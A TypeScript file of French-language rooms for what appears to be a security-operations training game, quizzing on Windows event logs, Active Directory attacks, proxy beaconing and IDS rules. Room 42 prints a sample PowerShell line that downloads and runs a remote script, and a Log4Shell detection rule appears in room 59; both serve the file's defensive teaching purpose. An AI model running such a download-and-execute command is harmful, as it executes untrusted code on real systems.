import type { RoomContent } from "@/lib/types";
import { answer, card, choice, multi, order, room } from "./_build";

/** Salles 41 à 60 du niveau Très difficile. */
export const TRES_DIFFICILE_4: RoomContent[] = [
  room(
    "tres-difficile-41",
    "La connexion de type 10",
    "Le SIEM remonte un événement 4624 sur le contrôleur de domaine, avec LogonType 10, à 3 h du matin, pour le compte d'un comptable.",
    card("Les types de connexion Windows", "Système", "🔟", "Le LogonType d'un événement 4624 dit comment la connexion a eu lieu.", [
      "2 : interactive (au clavier) ; 3 : réseau (partage, SMB) ; 5 : service.",
      "10 : RemoteInteractive, c'est-à-dire bureau à distance (RDP).",
      "Un comptable en RDP sur un contrôleur de domaine à 3 h du matin est très suspect.",
    ], "10 = RemoteInteractive."),
    choice("Que signifie LogonType 10 ?", [
      ["Une connexion par bureau à distance (RDP)", true, "C'est le type RemoteInteractive."],
      ["Une connexion au clavier, devant la machine", false, "Ce serait le type 2."],
      ["Un accès à un partage réseau", false, "Ce serait le type 3."],
    ]),
    "Session RDP coupée, compte désactivé : l'enquête commence.",
  ),
  room(
    "tres-difficile-42",
    "La ligne de commande trahie",
    "Grâce à l'audit de création de processus, l'événement 4688 montre la ligne de commande complète lancée par Word.",
    card("L'événement 4688", "Système", "🧾", "Création d'un processus, avec sa ligne de commande si l'option est activée.", [
      "Il faut activer « Inclure la ligne de commande dans les événements de création de processus ».",
      "On voit alors exactement ce qui a été lancé, avec quels arguments.",
      "Sysmon (événement 1) donne la même information avec plus de détails.",
    ], "Que lance Word ici ?"),
    answer("Quel programme Word a-t-il lancé ?", ["powershell.exe", "powershell"], {
      content: [
        "EventID: 4688",
        "Creator Process Name: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Process Command Line: powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')\"",
      ].join("\n"),
      contentLabel: "Journal Sécurité",
      placeholder: "Nom du programme",
    }),
    "PowerShell lancé par Word et téléchargeant un script : macro malveillante confirmée.",
  ),
  room(
    "tres-difficile-43",
    "Le nouveau compte",
    "À 2 h 13, un événement 4720 apparaît, suivi d'un 4732 sur le groupe « Administrateurs ».",
    card("Création de compte et ajout à un groupe", "Système", "👤", "4720 : compte créé ; 4728/4732/4756 : membre ajouté à un groupe.", [
      "Les attaquants créent souvent un compte de secours pour revenir plus tard.",
      "L'ajout immédiat à un groupe d'administrateurs est un signal fort de persistance.",
      "Ces événements doivent déclencher une alerte, surtout hors heures ouvrées.",
    ], "Que fait l'attaquant juste après avoir créé le compte ?"),
    multi("Que faut-il conclure et faire ?", [
      ["Un compte a été créé puis ajouté aux administrateurs locaux", true, "C'est la lecture de 4720 + 4732."],
      ["C'est probablement de la persistance d'attaquant", true, "Un accès de secours, hors heures ouvrées."],
      ["Désactiver le compte et chercher qui l'a créé", true, "Le champ Subject indique le compte à l'origine."],
      ["Ignorer, c'est sûrement une mise à jour Windows", false, "Windows ne crée pas d'administrateurs la nuit."],
    ]),
    "Compte malveillant supprimé. Le compte qui l'a créé était compromis.",
  ),
  room(
    "tres-difficile-44",
    "Le service sorti de nulle part",
    "L'événement 7045 indique l'installation d'un service nommé « WinUpdateHelper » pointant vers C:\\Users\\Public\\svc.exe.",
    card("L'installation de service (7045)", "Système", "⚙️", "Un nouveau service est un moyen classique de persistance et d'exécution en SYSTEM.", [
      "L'événement 7045 (journal Système) signale chaque nouveau service.",
      "Un exécutable dans C:\\Users\\Public ou un dossier temporaire est très suspect.",
      "Les outils d'administration à distance (PsExec) créent aussi des services temporaires.",
    ], "Où se trouve l'exécutable ?"),
    choice("Quel détail est le plus suspect ?", [
      ["L'exécutable est dans C:\\Users\\Public", true, "Un vrai service système n'est pas là."],
      ["Le nom contient « Update »", false, "Suspect aussi, mais un nom se choisit librement : l'emplacement est plus parlant."],
      ["Le service a une majuscule", false, "Aucune importance."],
    ]),
    "Service supprimé, exécutable envoyé en analyse.",
  ),
  room(
    "tres-difficile-45",
    "Le script décodé",
    "Le journal 4104 de PowerShell a enregistré le contenu réel d'un script, même s'il avait été lancé encodé.",
    card("La journalisation des blocs de script", "Système", "📝", "L'événement 4104 enregistre le code PowerShell réellement exécuté, après décodage.", [
      "Activée par stratégie de groupe (Script Block Logging).",
      "Même un script encodé ou obfusqué apparaît en clair au moment de son exécution.",
      "C'est une source précieuse pour les analystes, à envoyer au SIEM.",
    ], "Quel événement contient le code exécuté ?"),
    answer("Quel numéro d'événement enregistre le contenu des scripts PowerShell ?", ["4104"], { placeholder: "Numéro" }),
    "Journalisation 4104 activée partout. Les scripts n'ont plus de secrets.",
  ),
  room(
    "tres-difficile-46",
    "L'antivirus dans le script",
    "Un script PowerShell téléchargé en mémoire est bloqué avant même d'être exécuté, alors qu'aucun fichier n'a touché le disque.",
    card("AMSI", "Défense", "🧯", "Une interface qui permet à l'antivirus d'inspecter les scripts au moment de leur exécution.", [
      "AMSI (Antimalware Scan Interface) transmet le contenu des scripts PowerShell, VBScript, macros… à l'antivirus.",
      "Il voit le code après décodage, même s'il n'a jamais été écrit sur le disque.",
      "Les attaquants cherchent donc à le contourner : un contournement d'AMSI est un signal à surveiller.",
    ], "Une interface d'inspection en 4 lettres."),
    choice("Qu'est-ce qui a bloqué le script ?", [
      ["AMSI, qui a transmis le script à l'antivirus", true, "Le contenu est inspecté en mémoire, au moment de l'exécution."],
      ["Le pare-feu réseau", false, "Le script était déjà téléchargé."],
      ["La corbeille Windows", false, "Aucun rapport."],
    ]),
    "Script bloqué par AMSI. Le malware sans fichier n'est pas passé.",
  ),
  room(
    "tres-difficile-47",
    "L'abonnement invisible",
    "Rien dans les clés Run, rien dans les tâches planifiées. Pourtant le malware revient à chaque démarrage. Sysmon affiche des événements 19, 20 et 21.",
    card("La persistance WMI", "Système", "🕸️", "Un abonnement WMI peut lancer une commande à chaque démarrage ou événement.", [
      "Trois éléments : un filtre (quand), un consommateur (quoi), et une liaison entre les deux.",
      "Sysmon les journalise avec les événements 19, 20 et 21.",
      "Get-WMIObject -Namespace root\\subscription permet de les lister.",
    ], "Sysmon 19/20/21 concernent quelle technologie ?"),
    choice("Où se cache la persistance ?", [
      ["Dans un abonnement aux événements WMI", true, "Filtre + consommateur + liaison."],
      ["Dans le fond d'écran", false, "Non."],
      ["Dans le BIOS", false, "Les événements Sysmon pointent vers WMI."],
    ]),
    "Abonnement WMI supprimé. Le malware ne revient plus.",
  ),
  room(
    "tres-difficile-48",
    "La DLL au mauvais endroit",
    "Un logiciel légitime et signé, copié dans C:\\Users\\Public\\, charge une version.dll posée juste à côté de lui.",
    card("Le chargement latéral de DLL", "Système", "📚", "Faire charger une DLL malveillante par un programme légitime.", [
      "Windows cherche d'abord les DLL dans le dossier du programme.",
      "L'attaquant copie un exécutable signé avec sa propre DLL du même nom : c'est le DLL sideloading.",
      "Le processus semble légitime (signé), ce qui trompe les défenses.",
    ], "Où Windows cherche-t-il les DLL en premier ?"),
    choice("Pourquoi cette technique est-elle efficace ?", [
      ["Le code malveillant tourne dans un programme signé qui paraît légitime", true, "Il passe sous les radars basés sur la réputation."],
      ["Les DLL sont toujours chiffrées", false, "Ce n'est pas la raison."],
      ["Windows n'exécute jamais de DLL", false, "Il en charge en permanence."],
    ]),
    "DLL malveillante identifiée par son hash et son emplacement anormal.",
  ),
  room(
    "tres-difficile-49",
    "La réplication suspecte",
    "Le contrôleur de domaine reçoit une demande de réplication de l'annuaire… depuis le poste d'un utilisateur, pas d'un autre contrôleur.",
    card("DCSync", "Système", "🔄", "Se faire passer pour un contrôleur de domaine pour récupérer les hashs de tous les comptes.", [
      "L'attaquant utilise les droits de réplication pour demander les secrets (dont celui de krbtgt).",
      "Il faut des droits élevés (Domain Admins ou droits de réplication délégués).",
      "Détection : événement 4662 avec les GUID de réplication, depuis une machine qui n'est pas un DC.",
    ], "Qui devrait normalement demander une réplication ?"),
    choice("Pourquoi est-ce alarmant ?", [
      ["Seuls les contrôleurs de domaine répliquent : c'est probablement DCSync", true, "L'attaquant récupère les hashs de tout le domaine."],
      ["C'est une sauvegarde normale", false, "Une sauvegarde ne passe pas par la réplication depuis un poste."],
      ["Le poste a besoin de l'heure", false, "La synchronisation de l'heure n'utilise pas la réplication."],
    ]),
    "DCSync détecté. Réinitialisation du mot de passe krbtgt (deux fois) planifiée.",
  ),
  room(
    "tres-difficile-50",
    "Les comptes sans pré-authentification",
    "Le pirate demande des tickets Kerberos pour des comptes ayant l'option « Ne pas exiger de pré-authentification ». Il les casse hors ligne.",
    card("L'AS-REP roasting", "Système", "🔥", "Sans pré-authentification, n'importe qui obtient une réponse chiffrée avec le mot de passe du compte.", [
      "Cette réponse peut être cassée hors ligne, comme un hash.",
      "L'option est rarement nécessaire : il faut la retirer.",
      "Des mots de passe longs rendent le cassage impraticable.",
    ], "Quelle option faut-il retirer ?"),
    choice("Quelle est la meilleure correction ?", [
      ["Exiger la pré-authentification Kerberos sur tous les comptes", true, "La réponse n'est plus livrée à n'importe qui."],
      ["Renommer les comptes", false, "L'option reste active."],
      ["Désactiver Kerberos", false, "Le domaine ne fonctionnerait plus correctement."],
    ]),
    "Pré-authentification exigée partout. L'AS-REP roasting ne donne plus rien.",
  ),
  room(
    "tres-difficile-51",
    "L'authentification relayée",
    "Le pirate reçoit une authentification NTLM d'un poste… et la transmet immédiatement à un serveur de fichiers pour s'y connecter à sa place.",
    card("Le relais NTLM", "Réseau", "📨", "Relayer en direct l'authentification d'une victime vers un autre serveur.", [
      "Le pirate n'a pas besoin de casser le mot de passe : il relaie l'échange.",
      "La signature SMB obligatoire et l'EPA sur les services web bloquent le relais.",
      "Désactiver NTLM quand c'est possible et préférer Kerberos.",
    ], "Quelle option SMB empêche le relais ?"),
    multi("Quelles mesures bloquent cette attaque ?", [
      ["Rendre la signature SMB obligatoire", true, "Un message relayé ne peut plus être signé par le pirate."],
      ["Réduire ou désactiver NTLM au profit de Kerberos", true, "Moins de NTLM, moins de relais."],
      ["Activer l'EPA sur les services web internes", true, "Protection étendue de l'authentification."],
      ["Allonger le délai de mise en veille des écrans", false, "Aucun rapport."],
    ]),
    "Signature SMB obligatoire. Le relais échoue.",
  ),
  room(
    "tres-difficile-52",
    "La carte des chemins",
    "L'équipe rouge montre un graphe : depuis le compte du stagiaire, 4 étapes mènent au groupe Domain Admins.",
    card("Les chemins d'attaque Active Directory", "Défense", "🗺️", "Des outils comme BloodHound cartographient les relations qui mènent aux droits d'administration.", [
      "Sessions ouvertes, appartenances à des groupes, délégations de droits : tout forme un graphe.",
      "Les attaquants cherchent le chemin le plus court vers les administrateurs du domaine.",
      "Les défenseurs utilisent les mêmes outils pour casser ces chemins.",
    ], "Que doivent faire les défenseurs avec ce graphe ?"),
    choice("Que faire de ce résultat ?", [
      ["Supprimer les droits et sessions inutiles qui forment le chemin", true, "On casse le chemin avant qu'un attaquant ne l'emprunte."],
      ["Supprimer le compte du stagiaire seulement", false, "D'autres comptes peuvent emprunter le même chemin."],
      ["Ne rien changer, c'est seulement un graphe", false, "Ce graphe montre un risque réel."],
    ]),
    "Chemin cassé : le stagiaire ne mène plus nulle part.",
  ),
  room(
    "tres-difficile-53",
    "La stratégie de groupe modifiée",
    "Une GPO liée à tous les postes vient d'être modifiée : elle ajoute une tâche planifiée qui lance un script depuis un partage.",
    card("L'abus des stratégies de groupe", "Système", "🏛️", "Modifier une GPO permet d'exécuter du code sur des milliers de postes d'un coup.", [
      "Les rançongiciels utilisent souvent les GPO pour se déployer partout en même temps.",
      "Les droits de modification des GPO doivent être très restreints.",
      "Surveille les événements 5136 (modification d'objet d'annuaire) sur les GPO.",
    ], "Combien de postes reçoivent cette GPO ?"),
    choice("Pourquoi est-ce une alerte critique ?", [
      ["Le script va s'exécuter sur tous les postes du domaine", true, "C'est un moyen de déploiement massif, typique des rançongiciels."],
      ["La GPO va ralentir le réseau", false, "Le danger est bien plus grave."],
      ["Les GPO ne peuvent pas lancer de scripts", false, "Elles le peuvent."],
    ]),
    "Modification annulée avant le prochain rafraîchissement des stratégies. Le déploiement est stoppé.",
  ),
  room(
    "tres-difficile-54",
    "Connexions dans le cloud",
    "Dans les journaux de connexion Entra ID, un compte se connecte depuis la France, puis 4 minutes plus tard depuis le Brésil, avec un client « python-requests ».",
    card("Les journaux de connexion cloud", "Défense", "☁️", "Les journaux de connexion d'Entra ID (Azure AD) racontent qui se connecte, d'où et comment.", [
      "On y lit l'IP, le pays, l'application, le client (navigateur, script) et le résultat de la MFA.",
      "Un client scripté (python, curl) sur un compte humain est suspect.",
      "Combiné à un voyage impossible, c'est presque certainement un vol d'identifiants ou de jeton.",
    ], "Deux indices, pas un seul."),
    multi("Quels éléments sont suspects ?", [
      ["La France puis le Brésil en 4 minutes", true, "C'est un voyage impossible."],
      ["Un client python-requests pour un compte humain", true, "Un humain utilise un navigateur ou une appli."],
      ["La connexion depuis la France", false, "C'est la connexion habituelle de l'utilisateur."],
      ["Le nom de l'utilisateur", false, "Il n'a rien de suspect en soi."],
    ]),
    "Sessions révoquées, mot de passe changé, MFA résistante au phishing imposée.",
  ),
  room(
    "tres-difficile-55",
    "La règle de boîte aux lettres",
    "La boîte du directeur financier a une nouvelle règle : tout mail contenant « facture » ou « virement » est transféré vers une adresse externe puis supprimé.",
    card("Les règles de transfert malveillantes", "Social", "📮", "Après avoir volé une boîte mail, l'attaquant crée des règles pour espionner et cacher ses traces.", [
      "Transférer les mails sensibles et les supprimer permet de préparer une fraude au virement.",
      "Les règles aux noms très courts (« . », « .. ») sont un indice classique.",
      "Surveille la création de règles de transfert externe dans les journaux d'audit.",
    ], "Que vise l'attaquant avec « facture » et « virement » ?"),
    choice("Que prépare l'attaquant ?", [
      ["Une fraude au virement (BEC) en interceptant les échanges financiers", true, "Il pourra modifier les coordonnées bancaires au bon moment."],
      ["Un nettoyage de la boîte mail", false, "Il vole et cache des messages."],
      ["Une mise à jour automatique", false, "Aucune mise à jour ne crée ce type de règle."],
    ]),
    "Règle supprimée, transfert externe bloqué, virements suspects gelés.",
  ),
  room(
    "tres-difficile-56",
    "L'empreinte de la connexion TLS",
    "Le trafic d'un malware passe en HTTPS. Impossible de lire le contenu, mais son empreinte JA3 est identique à celle d'un outil d'attaque connu.",
    card("Les empreintes JA3/JA4", "Réseau", "👣", "La façon dont un client démarre une connexion TLS forme une empreinte.", [
      "Versions, suites de chiffrement, extensions : leur combinaison identifie souvent le logiciel.",
      "On repère un malware même si son trafic est chiffré.",
      "Une empreinte peut être imitée : c'est un indicateur, pas une preuve absolue.",
    ], "Peut-on reconnaître un client sans lire le contenu ?"),
    choice("Qu'apporte cette empreinte ?", [
      ["Elle identifie le logiciel client sans déchiffrer le trafic", true, "Utile pour repérer des outils malveillants."],
      ["Elle donne le contenu des échanges", false, "Le contenu reste chiffré."],
      ["Elle prouve l'identité de l'attaquant", false, "Une empreinte s'imite, et ne dit rien de la personne."],
    ]),
    "Empreinte ajoutée aux règles de détection. Le malware est repéré partout.",
  ),
  room(
    "tres-difficile-57",
    "Le journal du proxy",
    "Un poste contacte toutes les 60 secondes le même domaine récent, avec un User-Agent étrange.",
    card("Lire les journaux de proxy", "Défense", "📑", "Le proxy révèle les sites contactés, la fréquence, les volumes et le User-Agent.", [
      "Des requêtes très régulières vers un domaine récent évoquent un beaconing.",
      "Un User-Agent qui ne correspond à aucun navigateur installé est suspect.",
      "Le volume envoyé (bytes out) aide à repérer une exfiltration.",
    ], "Quel domaine revient sans cesse ?"),
    answer("Quel domaine le poste contacte-t-il régulièrement ?", ["cdn-update-sync.net"], {
      content: [
        "09:00:01 10.1.4.22 GET https://cdn-update-sync.net/c?id=7f3a 200 312 \"Mozilla/4.0 (compatible; MSIE 6.0)\"",
        "09:00:12 10.1.4.22 GET https://www.wikipedia.org/ 200 81233 \"Mozilla/5.0 (Windows NT 10.0) Chrome/130\"",
        "09:01:01 10.1.4.22 GET https://cdn-update-sync.net/c?id=7f3a 200 312 \"Mozilla/4.0 (compatible; MSIE 6.0)\"",
        "09:02:01 10.1.4.22 GET https://cdn-update-sync.net/c?id=7f3a 200 312 \"Mozilla/4.0 (compatible; MSIE 6.0)\"",
      ].join("\n"),
      contentLabel: "proxy.log",
      placeholder: "Nom de domaine",
    }),
    "Toutes les 60 s, avec un faux Internet Explorer 6 : c'est une balise C2. Poste isolé.",
  ),
  room(
    "tres-difficile-58",
    "Les journaux de Zeek",
    "L'équipe réseau ne stocke pas les captures complètes, mais des journaux Zeek : conn.log, dns.log, http.log, ssl.log…",
    card("Zeek", "Réseau", "🦓", "Un outil qui transforme le trafic réseau en journaux structurés.", [
      "conn.log résume chaque connexion (IP, ports, durée, volumes).",
      "dns.log garde toutes les requêtes DNS ; ssl.log les certificats et noms de serveurs.",
      "Beaucoup plus léger qu'une capture complète, et idéal pour la chasse aux menaces.",
    ], "Quel journal résume chaque connexion ?"),
    choice("Où chercher les connexions longues avec beaucoup de données envoyées ?", [
      ["conn.log", true, "Il contient la durée et les volumes de chaque connexion."],
      ["dns.log", false, "Il ne contient que les requêtes DNS."],
      ["ssl.log", false, "Il contient les informations TLS, pas les volumes détaillés."],
    ]),
    "Une connexion de 6 h avec 4 Go envoyés : l'exfiltration est trouvée.",
  ),
  room(
    "tres-difficile-59",
    "La signature réseau",
    "Une règle de l'IDS se déclenche : alert http any any -> $HOME_NET any (msg:\"Log4Shell\"; content:\"${jndi:\"; …).",
    card("Les signatures IDS", "Réseau", "🚨", "Un IDS comme Suricata ou Snort compare le trafic à des règles.", [
      "Une règle décrit un motif : protocole, sens, contenu recherché, message d'alerte.",
      "Ici, la chaîne ${jndi: dans une requête HTTP signale une tentative d'exploitation Log4Shell.",
      "Un IDS détecte ; un IPS peut aussi bloquer.",
    ], "Quelle chaîne la règle cherche-t-elle ?"),
    choice("Que détecte cette règle ?", [
      ["Une tentative d'exploitation de Log4Shell", true, "La chaîne ${jndi: est caractéristique."],
      ["Un téléchargement de musique", false, "Non."],
      ["Une connexion SSH", false, "La règle porte sur HTTP."],
    ]),
    "Tentative Log4Shell détectée. Le serveur visé était déjà à jour.",
  ),
  room(
    "tres-difficile-60",
    "Le message obfusqué",
    "Dans la configuration du malware, une chaîne hexadécimale et une note : « clé XOR = soc ».",
    card("Décoder une configuration XOR", "Crypto", "🧩", "Beaucoup de malwares cachent leurs adresses de serveur avec un simple XOR.", [
      "Le XOR avec une clé répétée se défait en réappliquant la même clé.",
      "L'atelier applique le XOR sur de l'hexadécimal avec la clé donnée.",
      "Une fois l'adresse du serveur retrouvée, on la bloque et on la partage comme indicateur.",
    ], "Applique le XOR avec la clé « soc »."),
    answer("Quel domaine de commande se cache dans la configuration ?", ["c2.evil-cdn.net"], {
      tools: ["xor", "hex", "base64", "reverse"],
      workshopInput: "105d4d16190a1f420017014d1d0a17",
      placeholder: "Nom de domaine",
    }),
    "Domaine C2 retrouvé et bloqué sur le proxy et le DNS.",
  ),
];
